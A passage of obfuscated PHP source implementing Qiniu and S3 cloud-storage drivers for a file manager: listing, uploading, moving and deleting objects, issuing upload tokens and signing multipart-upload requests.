$client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ƒÉ©—Û¤) { parent::__construct(); require_once SDK_DIR . $_SERVER[å¸¿•¶£][1444]; $this->_init($ƒÉ©—Û¤); } public function _init($–ºœ‚ûÔ) { $ò”¶ÃŒç =& $_SERVER[å¸¿•¶£]; $this->config = $–ºœ‚ûÔ; foreach ($–ºœ‚ûÔ as $£­Œ»Ó => $Ş·™Ñ¯£) { if (isset($this->{$£­Œ»Ó})) { $this->{$£­Œ»Ó} = $Ş·™Ñ¯£; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ò”¶ÃŒç[1445] . LNG($ò”¶ÃŒç[1403])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ë÷ªß¢µ, $¹´÷¾Â‰ = '', $¼Ì¸«¼Ù = REPEAT_RENAME) { if ($this->setContent($Ë÷ªß¢µ, $¹´÷¾Â‰)) { return $this->getPathOuter($Ë÷ªß¢µ); } return !1; } public function mkdir($·“Ÿ»áĞ, $Æ¥½äü = REPEAT_SKIP) { $Î½ÌÁÀµ =& $_SERVER[å¸¿•¶£]; $ïä¹ÏÜ = trim($·“Ÿ»áĞ, $Î½ÌÁÀµ[8]); if ($this->_isFolder($ïä¹ÏÜ)) { return $this->getPathOuter($ïä¹ÏÜ); } $·“Ÿ»áĞ = $ïä¹ÏÜ . $Î½ÌÁÀµ[8]; $‹ˆµÚı­ = get_path_this($ïä¹ÏÜ); $‚•¶ÕÑ = $·“Ÿ»áĞ . $‹ˆµÚı­; if (!$this->mkfile($‚•¶ÕÑ)) { return !1; } if (!$this->moveFile($‚•¶ÕÑ, $·“Ÿ»áĞ)) { $this->delFile($‚•¶ÕÑ); return !1; } return $this->getPathOuter($ïä¹ÏÜ); } public function copyFile($ÉŸ¿Æ„ø, $Ÿ‰Œ¥´®) { $¯Ùİ®ôá = $this->bucketManager->copy($this->bucket, $ÉŸ¿Æ„ø, $this->bucket, $Ÿ‰Œ¥´®, !0); return $¯Ùİ®ôá ? !1 : $this->getPathOuter($Ÿ‰Œ¥´®); } public function moveFile($˜Ÿãš», $ÅƒÀ‘£Ÿ) { $›şïû¼ = $this->bucketManager->move($this->bucket, $˜Ÿãš», $this->bucket, $ÅƒÀ‘£Ÿ, !0); return $›şïû¼ ? !1 : $this->getPathOuter($ÅƒÀ‘£Ÿ); } public function delFile($ıÆèûö˜) { if (!$this->exist($ıÆèûö˜)) { return !0; } $®Õ­ƒ²Ô = $this->bucketManager->delete($this->bucket, $ıÆèûö˜); return $®Õ­ƒ²Ô ? !1 : !0; } public function delFolder($´œ‡¨ô¨) { $‚™ğß° =& $_SERVER[å¸¿•¶£]; if (!$this->exist($´œ‡¨ô¨)) { return !0; } $this->listItemCache = !1; $èÉÁşÏŸ = $this->fileList($´œ‡¨ô¨); $this->listItemCache = !0; $Í‘ÒÉñ± = trim($´œ‡¨ô¨, $‚™ğß°[8]) . $‚™ğß°[8]; if (!empty($´œ‡¨ô¨) && $´œ‡¨ô¨ !== $‚™ğß°[198] && !in_array($Í‘ÒÉñ±, $èÉÁşÏŸ[$‚™ğß°[82]])) { $èÉÁşÏŸ[$‚™ğß°[82]][] = $Í‘ÒÉñ±; } $”¿–ûì = $this->delByBatch($èÉÁşÏŸ[$‚™ğß°[83]]); if (!$”¿–ûì) { return !1; } $”¿–ûì = $this->delByBatch($èÉÁşÏŸ[$‚™ğß°[82]]); if (!$”¿–ûì) { return !1; } return $this->delFile($Í‘ÒÉñ±); } private function delByBatch($§¡¥ÖñÏ) { foreach (array_chunk($§¡¥ÖñÏ, 1000) as $àå«Ùúö) { $ùıÊ©Ì© = $this->bucketManager->buildBatchDelete($this->bucket, $àå«Ùúö); list($‘É‹£ä›, $è¥¿£½) = $this->bucketManager->batch($ùıÊ©Ì©); if ($è¥¿£½) { return !1; } } return !0; } public function rename($˜Çì¦ËĞ, $Ö§­ø²®) { return $this->renameObject($˜Çì¦ËĞ, $Ö§­ø²®); } public function fileInfo($æ®¯şñ÷, $‚§†î«Å = false, $˜ãÃº³Æ = array()) { $¦Ïèó‡Ğ =& $_SERVER[å¸¿•¶£]; $ÀîùŸ­ = array($¦Ïèó‡Ğ[32] => $this->pathThis($æ®¯şñ÷), $¦Ïèó‡Ğ[84] => $this->getPathOuter($¦Ïèó‡Ğ[8] . $æ®¯şñ÷), $¦Ïèó‡Ğ[33] => $¦Ïèó‡Ğ[200], $¦Ïèó‡Ğ[76] => isset($˜ãÃº³Æ[$¦Ïèó‡Ğ[1446]]) ? $˜ãÃº³Æ[$¦Ïèó‡Ğ[1446]] : 0, $¦Ïèó‡Ğ[174] => $this->ext($æ®¯şñ÷)); if ($‚§†î«Å) { return $ÀîùŸ­; } $ÀîùŸ­[$¦Ïèó‡Ğ[201]] = $ÀîùŸ­[$¦Ïèó‡Ğ[85]] = 0; $ÀîùŸ­[$¦Ïèó‡Ğ[202]] = $ÀîùŸ­[$¦Ïèó‡Ğ[203]] = !0; if (empty($˜ãÃº³Æ)) { $˜ãÃº³Æ = $this->objectMeta($æ®¯şñ÷); if (!$˜ãÃº³Æ) { return $ÀîùŸ­; } } if (isset($˜ãÃº³Æ[$¦Ïèó‡Ğ[1447]])) { $ÀîùŸ­[$¦Ïèó‡Ğ[85]] = substr($˜ãÃº³Æ[$¦Ïèó‡Ğ[1447]] . $¦Ïèó‡Ğ[12], 0, 10); } if (isset($˜ãÃº³Æ[$¦Ïèó‡Ğ[1446]])) { $ÀîùŸ­[$¦Ïèó‡Ğ[76]] = $˜ãÃº³Æ[$¦Ïèó‡Ğ[1446]]; } return $ÀîùŸ­; } public function folderInfo($Ï²»Ö†£, $Œ“Û™ã = false) { $áõÉÆ”À =& $_SERVER[å¸¿•¶£]; $ÀôÁ¾’ = array($áõÉÆ”À[32] => $this->pathThis($Ï²»Ö†£), $áõÉÆ”À[84] => $this->getPathOuter($áõÉÆ”À[8] . $Ï²»Ö†£), $áõÉÆ”À[33] => $áõÉÆ”À[75]); if ($Œ“Û™ã) { return $ÀôÁ¾’; } $ÀôÁ¾’[$áõÉÆ”À[201]] = $ÀôÁ¾’[$áõÉÆ”À[85]] = 0; $ÀôÁ¾’[$áõÉÆ”À[202]] = $ÀôÁ¾’[$áõÉÆ”À[203]] = !0; $Ï²»Ö†£ = rtrim($Ï²»Ö†£, $áõÉÆ”À[8]) . $áõÉÆ”À[8]; $›½Å»ÁÁ = $this->objectMeta($Ï²»Ö†£); if (isset($›½Å»ÁÁ[$áõÉÆ”À[1447]])) { $ÀôÁ¾’[$áõÉÆ”À[85]] = substr($›½Å»ÁÁ[$áõÉÆ”À[1447]] . $áõÉÆ”À[12], 0, 10); } return $ÀôÁ¾’; } public function listPath($Ø¼Çíõã, $ÖûÔºª = false) { $™»ŠİÇ =& $_SERVER[å¸¿•¶£]; $ôªÉøæ = $this->fileList($Ø¼Çíõã, $™»ŠİÇ[8], !0); foreach ($ôªÉøæ[$™»ŠİÇ[82]] as $€—úµ¿ => $ú€ŸÔê) { $ôªÉøæ[$™»ŠİÇ[82]][$€—úµ¿] = $this->folderInfo($ú€ŸÔê, $ÖûÔºª); } foreach ($ôªÉøæ[$™»ŠİÇ[83]] as $€—úµ¿ => $ú€ŸÔê) { $ôªÉøæ[$™»ŠİÇ[83]][$€—úµ¿] = $this->fileInfo($ú€ŸÔê[$™»ŠİÇ[94]], $ÖûÔºª, $ú€ŸÔê); } return $ôªÉøæ; } public function has($…š««á, $Ñ¥ÍĞÛ× = false, $ô›ãëâˆ = true) { $¬­û´±• =& $_SERVER[å¸¿•¶£]; $…š««á = trim($…š««á, $¬­û´±•[8]); $ÒÓ‚Ÿ¾Ó = empty($…š««á) && $…š««á !== $¬­û´±•[198] ? $¬­û´±•[12] : $…š««á . $¬­û´±•[8]; $ÍÎœşÂ = $¬­û´±•[12]; $¼Š²ÉòÆ = 500; $´¹½‘ú¦ = $¬­û´±•[8]; $›¡£¶®è = $‚ğÕœö· = 0; while (!0) { check_abort(); list($š¼§âÎ¨, $è©×îÔø) = $this->bucketManager->listFiles($this->bucket, $ÒÓ‚Ÿ¾Ó, $ÍÎœşÂ, $¼Š²ÉòÆ, $´¹½‘ú¦); if ($è©×îÔø) { break; } $ÍÎœşÂ = array_key_exists($¬­û´±•[1415], $š¼§âÎ¨) ? $ÍÎœşÂ = $š¼§âÎ¨[$¬­û´±•[1448]] : $¬­û´±•[12]; if ($Ñ¥ÍĞÛ×) { if (!empty($š¼§âÎ¨[$¬­û´±•[1449]])) { $›¡£¶®è += count($š¼§âÎ¨[$¬­û´±•[1449]]); } if (!empty($š¼§âÎ¨[$¬­û´±•[1450]])) { $‚ğÕœö· += count($š¼§âÎ¨[$¬­û´±•[1450]]); } if ($ÍÎœşÂ === $¬­û´±•[12]) { break; } continue; } if ($ô›ãëâˆ) { if (!empty($š¼§âÎ¨[$¬­û´±•[1449]])) { return !0; } } else { if (!empty($š¼§âÎ¨[$¬­û´±•[1450]])) { return !0; } } if ($ÍÎœşÂ === $¬­û´±•[12]) { break; } } if ($Ñ¥ÍĞÛ×) { return array($¬­û´±•[207] => $›¡£¶®è, $¬­û´±•[208] => $‚ğÕœö·); } return !1; } public function listAll($äğ‚òú£) { $ÃôÍÜ =& $_SERVER[å¸¿•¶£]; $¬Õ×°Ä… = $this->fileList($äğ‚òú£, $ÃôÍÜ[12], !0); $¯·áÃ· = array_to_keyvalue($¬Õ×°Ä…[$ÃôÍÜ[83]], $ÃôÍÜ[32]); foreach ($¬Õ×°Ä…[$ÃôÍÜ[82]] as $œ­¸£) { if (is_string($œ­¸£)) { $¯·áÃ·[$œ­¸£] = array($ÃôÍÜ[76] => 0); } } return $this->listAllFiles($äğ‚òú£, $¯·áÃ·); } private function fileList($‰ãÕœç·, $ÓæîÌŞÒ = '', $‰£ø¥Ê³ = 0) { $Ì©¤õã =& $_SERVER[å¸¿•¶£]; $‰ãÕœç· = trim($‰ãÕœç·, $Ì©¤õã[8]); $éØ»Ü›î = empty($‰ãÕœç·) && $‰ãÕœç· !== $Ì©¤õã[198] ? $Ì©¤õã[12] : $‰ãÕœç· . $Ì©¤õã[8]; $«‹’¹Œİ = $Ì©¤õã[12]; $±ğÔÈÜ = 1000; $ô¥€êà = $ÀÏóÃÁ = array(); while (!0) { check_abort(); list($¡®ïØ§, $ªØ˜–™) = $this->bucketManager->listFiles($this->bucket, $éØ»Ü›î, $«‹’¹Œİ, $±ğÔÈÜ, $ÓæîÌŞÒ); if ($ªØ˜–™) { break; } $«‹’¹Œİ = array_key_exists($Ì©¤õã[1415], $¡®ïØ§) ? $«‹’¹Œİ = $¡®ïØ§[$Ì©¤õã[1448]] : $Ì©¤õã[12]; $ÎäÑÚ = isset($¡®ïØ§[$Ì©¤õã[1449]]) ? $¡®ïØ§[$Ì©¤õã[1449]] : array(); $š¢ßü½ = isset($¡®ïØ§[$Ì©¤õã[1450]]) ? $¡®ïØ§[$Ì©¤õã[1450]] : array(); foreach ($ÎäÑÚ as $½ì„ÑõÀ) { if ($½ì„ÑõÀ[$Ì©¤õã[94]] == $éØ»Ü›î) { continue; } $ò×Äù Š = $½ì„ÑõÀ[$Ì©¤õã[94]]; $ÂËŒÚ­¡ = $½ì„ÑõÀ[$Ì©¤õã[1446]]; $½ì„ÑõÀ[$Ì©¤õã[76]] = $ÂËŒÚ­¡; $Š©Œİ†Œ = $ÂËŒÚ­¡ == 0 && substr($ò×Äù Š, strlen($ò×Äù Š) - 1, 1) == $Ì©¤õã[8] ? !0 : !1; $this->cacheMethodInfoSet($ò×Äù Š, $Š©Œİ†Œ, $½ì„ÑõÀ); if ($Š©Œİ†Œ) { $ô¥€êà[] = $ò×Äù Š; continue; } $ÀÏóÃÁ[] = $‰£ø¥Ê³ ? $½ì„ÑõÀ : $ò×Äù Š; } foreach ($š¢ßü½ as $ò×Äù Š) { if ($ò×Äù Š == $éØ»Ü›î) { continue; } $ô¥€êà[] = $ò×Äù Š; $this->cacheMethodInfoSet($ò×Äù Š, !0); } if ($«‹’¹Œİ === $Ì©¤õã[12]) { break; } } $this->cacheMethodInfoSet($‰ãÕœç·, !0); return array($Ì©¤õã[82] => $ô¥€êà, $Ì©¤õã[83] => $ÀÏóÃÁ); } public function canRead($‡êº›Õ) { return $this->exist($‡êº›Õ) ? !0 : !1; } public function canWrite($¹Û¡‘º†) { return $this->exist($¹Û¡‘º†) ? !0 : !1; } public function getContent($«ò¾íçª) { return $this->fileSubstr($«ò¾íçª, 0, -1); } public function setContent($ª¡ŒŸ”İ, $èø÷ÇÛÓ = '') { $ÔœàÍ®– = $this->tempFile($this->pathThis($ª¡ŒŸ”İ)); file_put_contents($ÔœàÍ®–, $èø÷ÇÛÓ); if ($this->upload($ª¡ŒŸ”İ, $ÔœàÍ®–)) { $this->tempFileRemve($ÔœàÍ®–); return !0; } return !1; } public function refreshUrls($ûïäæØò) { $úÓÂêÍ­ =& $_SERVER[å¸¿•¶£]; $…ÂÛ¢¹  = array(); if (is_array($ûïäæØò)) { foreach ($ûïäæØò as $ñİÊªÀ¾) { $…ÂÛ¢¹ [] = $this->link($ñİÊªÀ¾); } } else { $…ÂÛ¢¹ [] = $this->link($ûïäæØò); } $œï™Î®˜ = new Qiniu\Cdn\CdnManager($this->auth); list($¢îùÒ, $Üƒ¡Ö˜—) = $œï™Î®˜->refreshUrls($…ÂÛ¢¹ ); if ($Üƒ¡Ö˜—) { return !1; } return $¢îùÒ[$úÓÂêÍ­[1189]] == $úÓÂêÍ­[766] ? !0 : !1; } public function fileSubstr($ŞÙËöõ, $ˆ€œ¹—û, $¼æ°®ê) { $Á¢îİ·¼ =& $_SERVER[å¸¿•¶£]; if (!($Şå»©Å— = $this->link($ŞÙËöõ))) { return !1; } $¶äâ•ñÀ = !1; if ($¼æ°®ê > 0) { $ôùÜÔ·ã = $ˆ€œ¹—û + $¼æ°®ê - 1; $¶äâ•ñÀ = array($Á¢îİ·¼[1451] . $ˆ€œ¹—û . $Á¢îİ·¼[386] . $ôùÜÔ·ã); } $Š¨®ÚÖ = url_request($Şå»©Å—, $Á¢îİ·¼[230], !1, $¶äâ•ñÀ); return $Š¨®ÚÖ[$Á¢îİ·¼[756]] ? $Š¨®ÚÖ[$Á¢îİ·¼[1209]] : !1; } public function upload($ßû¦¦‹†, $Æ½ÃÏ¹·, $‘ËÎÓş = false, $Üë¯»÷Ğ = REPEAT_REPLACE) { $œÂâ—¥¨ = new Qiniu\Storage\UploadManager(); $Ã¯ôÆ²‹ = $this->auth->uploadToken($this->bucket, $ßû¦¦‹†); $Ú»¡†İÓ = get_file_mime(get_path_ext($Æ½ÃÏ¹·)); list($âùâ¤³Š, $°«óİÎÇ) = $œÂâ—¥¨->putFile($Ã¯ôÆ²‹, $ßû¦¦‹†, $Æ½ÃÏ¹·, null, $Ú»¡†İÓ); return $°«óİÎÇ ? !1 : $this->getPathOuter($ßû¦¦‹†); } public function uploadFormData($¥­Æìóá, $‹œ¥ãÍü = 3600) { return $this->uploadToken($¥­Æìóá, $‹œ¥ãÍü); } public function multiUploadFormData($Š©šçì•, $Ï‰ÕÌ›… = 3600) { return $this->uploadToken($Š©šçì•, $Ï‰ÕÌ›…); } private function uploadToken($æ¾˜÷, $¾Ç•ÕÛ¬ = 3600) { $¼ª¯ÙŞ =& $_SERVER[å¸¿•¶£]; $ˆ‹ı§¿› = $¾Ç•ÕÛ¬; $¬ÄË»™ = array($¼ª¯ÙŞ[1452] => $¼ª¯ÙŞ[1453]); $•€Âı…  = $æ¾˜÷; $ĞøëõµÂ = $this->auth->uploadToken($this->bucket, $•€Âı… , $ˆ‹ı§¿›, $¬ÄË»™, !0); $”ÜÆâˆ³ = empty($this->region) || $this->region == $¼ª¯ÙŞ[1454] ? $¼ª¯ÙŞ[12] : $¼ª¯ÙŞ[386] . $this->region; $şàîÄ¨ = http_type() . "\72\x2f\57\x75\x70\154\x6f\x61\x64{$”ÜÆâˆ³}\56\x71\151\156\x69\x75\160\56\143\157\155\x2f"; return array($¼ª¯ÙŞ[1455] => $ĞøëõµÂ, $¼ª¯ÙŞ[1456] => $şàîÄ¨); } public function download($ÙÈ¿‹ö­, $§˜á¤¨Ÿ) { $ÀéÅŞ› = IO::getPathInner(IO::mkfile($§˜á¤¨Ÿ)); if (!($­É ¤¨Ö = $this->link($ÙÈ¿‹ö­))) { return !1; } $ùÒĞõä½ = 0; $·Ñ‡¶¥ = 1024 * 200; $Ò²”ÄÈƒ = fopen($ÀéÅŞ›, $_SERVER[å¸¿•¶£][1457]); while (!0) { $à¢˜ÅÑ  = $this->fileSubstr($ÙÈ¿‹ö­, $ùÒĞõä½, $·Ñ‡¶¥); if ($à¢˜ÅÑ  === !1) { return !1; } fwrite($Ò²”ÄÈƒ, $à¢˜ÅÑ ); $ùÒĞõä½ += $·Ñ‡¶¥; if (strlen($à¢˜ÅÑ ) < $·Ñ‡¶¥) { break; } } fclose($Ò²”ÄÈƒ); return $§˜á¤¨Ÿ; } public function link($©ßøš³©, $¨ÎÑ¸ÖÑ = '') { if (!$this->isFile($©ßøš³©)) { return !1; } $–¬ÑŸ¥¾ = $this->getHost() . $_SERVER[å¸¿•¶£][8] . $this->pathEncode($©ßøš³©) . $¨ÎÑ¸ÖÑ; return $this->auth->privateDownloadUrl($–¬ÑŸ¥¾, 3600 * 12); } public function fileOut($ œ¹¼ô˜, $²åøÉ¾š = false, $Ãú—ƒ© = false, $©•î€Á = '') { $­üí£¿È =& $_SERVER[å¸¿•¶£]; if ($this->isFileOutServer()) { return $this->fileOutServer($ œ¹¼ô˜, $²åøÉ¾š, $Ãú—ƒ©, $©•î€Á); } if (!$Ãú—ƒ©) { $Ãú—ƒ© = $this->pathThis($ œ¹¼ô˜); } $£ÉíùÁ– = $²åøÉ¾š ? $­üí£¿È[1458] . rawurlencode($Ãú—ƒ©) : $­üí£¿È[12]; $ÚùÔ›š = $this->link($ œ¹¼ô˜, $£ÉíùÁ–); $this->fileOutLink($ÚùÔ›š); } public function fileOutServer($½…Å´ÜÃ, $©‘¢½š = false, $ÖØÌ± = false, $Ò€ÂÑç’ = '') { parent::fileOut($½…Å´ÜÃ, $©‘¢½š, $ÖØÌ±, $Ò€ÂÑç’); } public function fileOutImage($Î†€ıÃÆ, $„£î¼º = 250) { $ïÆü²ëƒ = $this->link($Î†€ıÃÆ, $_SERVER[å¸¿•¶£][1459] . $„£î¼º); $this->fileOutLink($ïÆü²ëƒ); } public function fileOutImageServer($È‚ƒ½“Š, $üÂ¢ÁÖÔ = 250) { parent::fileOutImage($È‚ƒ½“Š, $üÂ¢ÁÖÔ); } public function hashMd5($»¡¬ƒÓ) { $Ã¸ÂúÙ¹ =& $_SERVER[å¸¿•¶£]; $šùä˜’ = $this->objectMeta($»¡¬ƒÓ); return isset($šùä˜’[$Ã¸ÂúÙ¹[212]]) ? $šùä˜’[$Ã¸ÂúÙ¹[212]] : !1; $„³Šƒğ = $this->link($»¡¬ƒÓ, $Ã¸ÂúÙ¹[1460]); } public function size($´óò½’œ) { $Æê¼æöş = $this->objectMeta($´óò½’œ); return $Æê¼æöş ? $Æê¼æöş[$_SERVER[å¸¿•¶£][76]] : 0; } public function info($»•‡†€ë) { if ($this->isFolder($»•‡†€ë)) { return $this->folderInfo($»•‡†€ë); } else { if ($this->isFile($»•‡†€ë)) { return $this->fileInfo($»•‡†€ë); } } return !1; } public function exist($‹ğ¡î§æ) { return $this->isFile($‹ğ¡î§æ) || $this->isFolder($‹ğ¡î§æ); } public function isFile($ŠÖµÛı™) { return !$this->isFolder($ŠÖµÛı™) && $this->objectMeta($ŠÖµÛı™); } public function isFolder($¤å¹ÂîÅ) { return $this->cacheMethod($_SERVER[å¸¿•¶£][165], $¤å¹ÂîÅ); } protected function objectMeta($Ñ“åÂ•ç) { return $this->cacheMethod($_SERVER[å¸¿•¶£][167], $Ñ“åÂ•ç); } protected function _objectMeta($«ó§Š“º) { $ÊŸ‘Ô‚ =& $_SERVER[å¸¿•¶£]; list($ˆ¤Ù‡„, $€˜Ó±õÎ) = $this->bucketManager->stat($this->bucket, $«ó§Š“º); if ($ˆ¤Ù‡„) { $ˆ¤Ù‡„[$ÊŸ‘Ô‚[76]] = intval($ˆ¤Ù‡„[$ÊŸ‘Ô‚[1446]]); } return $ˆ¤Ù‡„; } protected function _isFolder($Æ¤™óŸÔ) { $´şŠÀü» =& $_SERVER[å¸¿•¶£]; if ($Æ¤™óŸÔ == $´şŠÀü»[12] || $Æ¤™óŸÔ == $´şŠÀü»[8]) { return !0; } list($‡ ·‘†Ş, $¬¦¼¢Œ) = $this->bucketManager->listFiles($this->bucket, trim($Æ¤™óŸÔ, $´şŠÀü»[8]) . $´şŠÀü»[8], $´şŠÀü»[12], 1, $´şŠÀü»[8]); return !empty($‡ ·‘†Ş[$´şŠÀü»[1449]]) || !empty($‡ ·‘†Ş[$´şŠÀü»[1450]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($˜¡ğí€–) { parent::__construct($˜¡ğí€–); } public function uploadFormData($îìÆ™¬ï, $¦«ïŞ‰ = 3600) { $ë†¬Ë– =& $_SERVER[å¸¿•¶£]; $•¼Øœ÷² = $ë†¬Ë–[199]; $ÚÈúÓÇù = $ë†¬Ë–[1365]; $¶Ù‰¯£’ = $ë†¬Ë–[62]; $¼Çâ½ºÉ = gmdate($ë†¬Ë–[1366]); $ğôùş¦¤ = gmdate($ë†¬Ë–[757]); $…ñşÒ¾â = $ë†¬Ë–[1367]; $úÀ„Ä£š = $¦«ïŞ‰ . $ë†¬Ë–[12]; $»åÍÒßÎ = $ë†¬Ë–[1329]; $‘´¯ô¨ = array($this->accessKey, $ğôùş¦¤, $this->region, $¶Ù‰¯£’, $…ñşÒ¾â); $“ŠÈæ = implode($ë†¬Ë–[8], $‘´¯ô¨); $òÓ¹×›È = array($ë†¬Ë–[1331] => gmdate($ë†¬Ë–[1330], strtotime($ë†¬Ë–[1368])), $ë†¬Ë–[1332] => array(array($ë†¬Ë–[1334] => $this->bucket), array($ë†¬Ë–[1333] => $•¼Øœ÷²), array($ë†¬Ë–[1335], $ë†¬Ë–[1336], $ë†¬Ë–[12]), array($ë†¬Ë–[1335], $ë†¬Ë–[1369], $ë†¬Ë–[12]), array($ë†¬Ë–[1335], $ë†¬Ë–[1370], $ë†¬Ë–[12]), array($ë†¬Ë–[1337] => $»åÍÒßÎ), array($ë†¬Ë–[1371] => $“ŠÈæ), array($ë†¬Ë–[1372] => $ÚÈúÓÇù), array($ë†¬Ë–[1373] => $¼Çâ½ºÉ), array($ë†¬Ë–[1374] => $úÀ„Ä£š))); $ŒÇ˜´„± = base64_encode(json_encode($òÓ¹×›È)); $²ÄÚ°Ç = hash_hmac($ë†¬Ë–[1375], $ğôùş¦¤, $ë†¬Ë–[1376] . $this->secret, !0); $³õ Œš“ = hash_hmac($ë†¬Ë–[1375], $this->region, $²ÄÚ°Ç, !0); $¢–¶ÀÛù = hash_hmac($ë†¬Ë–[1375], $¶Ù‰¯£’, $³õ Œš“, !0); $›³½›‘ = hash_hmac($ë†¬Ë–[1375], $…ñşÒ¾â, $¢–¶ÀÛù, !0); $±»û«€Ç = hash_hmac($ë†¬Ë–[1375], $ŒÇ˜´„±, $›³½›‘); $“ºñùÓÇ = array($ë†¬Ë–[215] => $ë†¬Ë–[12], $ë†¬Ë–[1377] => $ë†¬Ë–[12], $ë†¬Ë–[1333] => $•¼Øœ÷², $ë†¬Ë–[1337] => $»åÍÒßÎ, $ë†¬Ë–[1341] => $ŒÇ˜´„±, $ë†¬Ë–[1378] => $“ŠÈæ, $ë†¬Ë–[1379] => $ÚÈúÓÇù, $ë†¬Ë–[1380] => $¼Çâ½ºÉ, $ë†¬Ë–[1381] => $úÀ„Ä£š, $ë†¬Ë–[1382] => $±»û«€Ç, $ë†¬Ë–[182] => $this->getHost()); return $“ºñùÓÇ; } public function multiUploadFormData($İ¾ÒŒ‰á, $—Ü“³†ë = 3600) { $Çàû˜çƒ =& $_SERVER[å¸¿•¶£]; $™©±çë¢ = gmdate($Çàû˜çƒ[1461]); $ÖÚô¤Ù = array(); $ğ¯ÎŠ™˜ = $this->client->getUploadId($this->bucket, $İ¾ÒŒ‰á, $ÖÚô¤Ù); if (!$ğ¯ÎŠ™˜) { return !1; } return array($Çàû˜çƒ[223] => $ğ¯ÎŠ™˜, $Çàû˜çƒ[182] => $this->getHost() . $Çàû˜çƒ[8] . $this->pathEncode($İ¾ÒŒ‰á), $Çàû˜çƒ[224] => $™©±çë¢, $Çàû˜çƒ[94] => $İ¾ÒŒ‰á); } public function multiUploadAuthData($…³Òí“Æ, $½”›£ñÊ = array()) { $óÊé‹ã =& $_SERVER[å¸¿•¶£]; $ÎË¥±¼ = isset($½”›£ñÊ[$óÊé‹ã[174]]) ? $½”›£ñÊ[$óÊé‹ã[174]] : $óÊé‹ã[12]; $´¶À¶¿ç = $½”›£ñÊ[$óÊé‹ã[94]]; unset($½”›£ñÊ[$óÊé‹ã[94]]); if (isset($½”›£ñÊ[$óÊé‹ã[225]])) { return $this->listUploadParts($´¶À¶¿ç, $½”›£ñÊ); } $çÚŠöúò = array(); if (isset($½”›£ñÊ[$óÊé‹ã[1462]])) { $çÚŠöúò[$óÊé‹ã[1463]] = $½”›£ñÊ[$óÊé‹ã[1462]]; } $ùØŞ‡¹‡ = explode($óÊé‹ã[184], $this->getHost()); $å§Ç€Àó = array($óÊé‹ã[1464] => $ùØŞ‡¹‡[1], $óÊé‹ã[1465] => $óÊé‹ã[12], $óÊé‹ã[215] => $óÊé‹ã[120], $óÊé‹ã[1377] => $½”›£ñÊ[$óÊé‹ã[76]]); $ñäï²âí = $óÊé‹ã[228]; $ıéş¼ÕØ = $óÊé‹ã[8] . $this->pathEncode($´¶À¶¿ç) . $ÎË¥±¼; $öùÜ’ıÑ = $this->client->__getSignatureV4($çÚŠöúò, $å§Ç€Àó, $ñäï²âí, $ıéş¼ÕØ); if (strpos($ÎË¥±¼, $óÊé‹ã[227]) === 0) { if (isset($çÚŠöúò[$óÊé‹ã[1463]])) { $¾®çÒĞ = $çÚŠöúò[$óÊé‹ã[1463]]; } else { if (isset($öùÜ’ıÑ[$óÊé‹ã[1463]])) { $¾®çÒĞ = $öùÜ’ıÑ[$óÊé‹ã[1463]]; } else { $¾®çÒĞ = hash($óÊé‹ã[1375], $óÊé‹ã[12]); } } return array($óÊé‹ã[234] => $öùÜ’ıÑ[$óÊé‹ã[234]], $óÊé‹ã[1463] => $¾®çÒĞ, $óÊé‹ã[224] => $öùÜ’ıÑ[$óÊé‹ã[1466]]); } return $öùÜ’ıÑ[$óÊé‹ã[234]]; } public function listUploadParts($¼ğ©çÄ˜, $º»¾ÔÏ = array()) { $Úşù™‡ê =& $_SERVER[å¸¿•¶£]; $®«äú‰³ = str_replace($Úşù™‡ê[235], $Úşù™‡ê[12], $º»¾ÔÏ[$Úşù™‡ê[174]]); $ÛßÂ¬„Ç = $this->client->listParts($this->bucket, $¼ğ©çÄ˜, $®«äú‰³); if (!$ÛßÂ¬„Ç) { return !1; } $‰›æ¿üë = $Úşù™‡ê[1467]; foreach ($ÛßÂ¬„Ç as $»´ÈÉ®ƒ) { $‰›æ¿üë .= $Úşù™‡ê[1468] . "\x3c\120\x61\x72\x74\x4e\x75\155\x62\145\162\x3e{$»´ÈÉ®ƒ[$Úşù™‡ê[1422]]}\74\x2f\120\x61\x72\164\116\x75\155\142\145\x72\x3e\12" . "\x3c\x45\x54\x61\147\x3e{$»´ÈÉ®ƒ[$Úşù™‡ê[1423]]}\x3c\57\x45\x54\x61\147\76\xa" . $Úşù™‡ê[1469]; } $‰›æ¿üë .= $Úşù™‡ê[1470]; $‚ê´…î = array(); $ÉÇ¨Ãª³ = explode($Úşù™‡ê[184], $this->getHost()); $Í¡¿¦ø = array($Úşù™‡ê[1464] => $ÉÇ¨Ãª³[1], $Úşù™‡ê[215] => $Úşù™‡ê[120], $Úşù™‡ê[1377] => strlen($‰›æ¿üë)); $®Ğ€ ™Ó = $Úşù™‡ê[226]; $…ù¼¿© = $Úşù™‡ê[8] . $this->pathEncode($¼ğ©çÄ˜) . $º»¾ÔÏ[$Úşù™‡ê[174]]; $´×û½²ê = $this->client->__getSignatureV4($‚ê´…î, $Í¡¿¦ø, $®Ğ€ ™Ó, $…ù¼¿©, $‰›æ¿üë); return array($Úşù™‡ê[234] => $´×û½²ê[$Úşù™‡ê[234]], $Úşù™‡ê[224] => $´×û½²ê[$Úşù™‡ê[1466]], $Úşù™‡ê[236] => $ÛßÂ¬„Ç, $Úşù™‡ê[1463] => $´×û½²ê[$Úşù™‡ê[1463]]); } public function link($€¹öŒÒÛ, $š‡Ìçì’ = array()) { return parent::link($€¹öŒÒÛ, $š‡Ìçì’); } public function fileOut($ô…ÕÔÊë, $Ü¹¸¼›š = false, $Æ‚çã® = false, $½½ÀœõŞ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[å¸¿•¶£][1471])) { return parent::fileOutServer($ô…ÕÔÊë, $Ü¹¸¼›š, $Æ‚çã®, $½½ÀœõŞ); } parent::fileOut($ô…ÕÔÊë, $Ü¹¸¼›š, $Æ‚çã®, $½½ÀœõŞ); } public function fileOutImage($¯úÛ©, $£“íó« = 250) { if (strstr($this->endpoint, $_SERVER[å¸¿•¶£][1471])) { return parent::fileOutImageServer($¯úÛ©, 